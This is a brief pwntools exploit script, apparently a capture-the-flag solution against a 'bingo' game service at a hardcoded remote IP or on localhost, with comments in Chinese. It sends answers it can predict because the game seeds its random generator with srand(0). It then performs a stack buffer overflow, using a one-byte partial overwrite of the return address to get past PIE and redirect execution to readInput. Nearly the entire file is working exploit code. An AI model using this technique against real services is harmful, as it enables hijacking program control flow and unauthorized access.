# -*- coding: utf-8 -*-
from pwn import *
import sys
context.arch = 'amd64'

print sys.argv
if len(sys.argv) == 2 and sys.argv[1] == 'remote':
    r = remote('35.201.132.60', 12001)
else:
    r = remote('localhost',8888)

#由於srand(0)的關係 所以每次輸入是固定的
answers = [183, 86, 177, 115, 193, 135, 186, 92, 49, 21, 162, 27, 90, 59, 163, 126]


r.recvuntil('please input your numbers:')
#answer
for ans in answers:
    r.sendline(str(ans))

#此時可以觸發bof漏洞 控制rip
r.recvuntil('Winner can leave message for others:')
#由於PIE 所以只蓋掉最低byte做ret2text
#跳到playBingo+102      call readInput
#r.send('x'*12 + str(0x97).encode('hex'))
r.send('x'*12 + p8(0x44))
r.interactive()
